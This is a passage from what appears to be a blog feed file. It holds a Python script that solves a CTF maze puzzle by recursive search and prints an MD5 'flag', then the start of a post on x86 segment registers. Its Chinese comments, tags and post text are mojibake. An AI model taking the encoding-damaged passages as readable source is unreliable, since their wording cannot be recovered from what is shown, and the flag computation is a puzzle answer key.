<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">map2 = [</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_way</span>(<span class="params">a,b,c,num,max_num</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testc</span>():</span><br><span class="line">        ans = []</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">map</span>[a*<span class="number">64</span>+b*<span class="number">8</span>+i] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> i&lt; c-<span class="number">1</span>:</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    ans.append([i+<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">                <span class="keyword">elif</span> i&gt;c+<span class="number">1</span>:</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    ans.append([i-<span class="number">1</span>,<span class="string">&#x27;d&#x27;</span>])</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>, c</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, ans</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testb</span>():</span><br><span class="line">        ans = []</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">map</span>[a*<span class="number">64</span>+i*<span class="number">8</span>+c] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> i&lt; b-<span class="number">1</span>:</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    ans.append([i+<span class="number">1</span>,<span class="string">&#x27;w&#x27;</span>])</span><br><span class="line">                <span class="keyword">elif</span> i&gt;b+<span class="number">1</span>:</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    ans.append([i-<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>])</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>, b</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, ans</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testa</span>():</span><br><span class="line">        ans = []</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">map</span>[i*<span class="number">64</span>+b*<span class="number">8</span>+c] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> i&lt; a-<span class="number">1</span>:</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    ans.append([i+<span class="number">1</span>,<span class="string">&#x27;n&#x27;</span>])</span><br><span class="line">                <span class="keyword">elif</span> i&gt;a+<span class="number">1</span>:</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    ans.append([i-<span class="number">1</span>,<span class="string">&#x27;u&#x27;</span>])</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>, b</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, ans</span><br><span class="line">    <span class="keyword">if</span> num&gt;max_num:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>,<span class="number">0</span></span><br><span class="line">    way = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    pos = a*<span class="number">64</span>+b*<span class="number">8</span>+c</span><br><span class="line">    <span class="keyword">if</span> pos==<span class="number">436</span>:</span><br><span class="line">        <span class="keyword">return</span> way,<span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (num%<span class="number">2</span>):</span><br><span class="line">        <span class="built_in">map</span>=map2</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">map</span>=map1</span><br><span class="line">    test_c = testc()</span><br><span class="line">    test_a = testa()</span><br><span class="line">    test_b = testb()</span><br><span class="line">    <span class="keyword">if</span> test_c[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(test_c[<span class="number">1</span>])):</span><br><span class="line">            next_way =  find_way(a,b,test_c[<span class="number">1</span>][j][<span class="number">0</span>],num+<span class="number">1</span>,max_num) <span class="comment">#ç¬¬ä¸€ç§æƒ…å†µ</span></span><br><span class="line">            <span class="keyword">if</span> next_way[<span class="number">1</span>]:</span><br><span class="line">                way=test_c[<span class="number">1</span>][j][<span class="number">1</span>]+next_way[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">return</span> way,<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> test_a[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(test_a[<span class="number">1</span>])):</span><br><span class="line">            next_way = find_way(test_a[<span class="number">1</span>][j][<span class="number">0</span>],b,c,num+<span class="number">1</span>,max_num)</span><br><span class="line">            <span class="keyword">if</span> next_way[<span class="number">1</span>]:</span><br><span class="line">                way = test_a[<span class="number">1</span>][j][<span class="number">1</span>]+next_way[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">return</span> way, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> test_b[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(test_b[<span class="number">1</span>])):</span><br><span class="line">            next_way = find_way(a,test_b[<span class="number">1</span>][j][<span class="number">0</span>],c,num+<span class="number">1</span>,max_num)</span><br><span class="line">            <span class="keyword">if</span> next_way[<span class="number">1</span>]:</span><br><span class="line">                way = test_b[<span class="number">1</span>][j][<span class="number">1</span>]+next_way[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">return</span> way, <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> way, <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> max_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>,<span class="number">50</span>):</span><br><span class="line">    mstr = (find_way(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,max_num))[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> mstr!=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(mstr)</span><br><span class="line">        <span class="built_in">hash</span> = hashlib.md5()</span><br><span class="line">        <span class="built_in">hash</span>.update(mstr.encode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span>+<span class="built_in">hash</span>.hexdigest()+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> ç®—æ³• </tag>
            
            <tag> åè°ƒè¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win-æ®µå¯„å­˜å™¨</title>
      <link href="/posts/3bf83b56.html"/>
      <url>/posts/3bf83b56.html</url>
      
        <content type="html"><![CDATA[<hr><p>16ä½ï¼šå®æ¨¡å¼<br>32ä½ï¼šä¿æŠ¤æ¨¡å¼<br>64ä½ï¼šIA-32eæ¨¡å¼</p><hr><p>ES  CS SS DS FS GS LDTR TR</p><p>æ®µå¯„å­˜å™¨é•¿åº¦ï¼š96ä½</p><p>å®æ¨¡å¼</p><p>å®é™…åœ°å€=æ®µåœ°å€å·¦ç§»4ä½+åç§»é‡</p><p>eg:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>:[<span class="built_in">si</span>],<span class="built_in">ax</span></span><br><span class="line">ç­‰ä»·</span><br><span class="line"><span class="keyword">mov</span> [<span class="built_in">ds</span>*<span class="number">16</span>+<span class="built_in">si</span>],<span class="built_in">ax</span></span><br></pre></td></tr></table></figure><p>ä¿æŠ¤æ¨¡å¼ï¼š</p><p>ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œcpuä¾æ—§é€šè¿‡çŸ­åœ°å€å’Œåç§»é‡å¯»å€ï¼Œä½†æ˜¯æ®µå¯„å­˜å™¨ä¸ç›´æ¥ä¿å­˜åç§»ï¼Œä¸‹é¢æ˜¯æ®µå¯„å­˜å™¨åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹çš„ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SegMent</span>//ç¤ºæ„</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">WORD Selector;<span class="comment">//æ®µé€‰æ‹©å­</span></span><br><span class="line">WORD Atrributes;<span class="comment">//å±æ€§</span></span><br><span class="line">DWORD Base;</span><br><span class="line">DWORD Limit;<span class="comment">//æ®µç•Œé™</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ®µé€‰æ‹©å­ï¼š</p><p>002Bï¼šï¼ˆå‰8ä½æ˜¯0ï¼‰00101  0  11</p><p>å…¶ä¸­ä½2ä½ä¸ºå½“å‰è¯·æ±‚æƒé™çº§åˆ«<code>RPL</code>ï¼šä»r0åˆ°r3ï¼Œå…¶ä¸­CSå¯„å­˜å™¨çš„ä½2ä½å­˜ç€csä¸­eipçš„åç§»ï¼Œå³csæŒ‡å‘å½“å‰ä»£ç æ®µï¼Œå®ƒçš„RPLè¢«ç§°ä¸º<code>CPL</code>ï¼ŒåŒç†äºæŒ‡å‘å †æ ˆçš„SSå¯„å­˜å™¨</p><p>ç¬¬3ä½è¡¨ç¤ºæŸ¥è¯¢å“ªå¼ è¡¨ï¼šä¸€èˆ¬æœ‰ä¸¤å¼ 